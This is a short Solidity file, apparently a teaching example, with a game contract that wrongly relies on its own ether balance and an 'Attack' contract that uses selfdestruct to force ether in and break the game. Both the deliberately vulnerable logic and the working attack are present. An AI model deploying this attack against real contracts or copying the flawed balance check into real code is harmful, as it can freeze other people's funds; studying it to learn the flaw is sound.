// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "Only 1 ether alllowed");
        uint balance = address(this).balance; // should get balance = balance+msg.value;

        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send ether");
    }
}

contract Attack {
    function attack(address payable _addr) public payable {
        selfdestruct(_addr);
    }
}
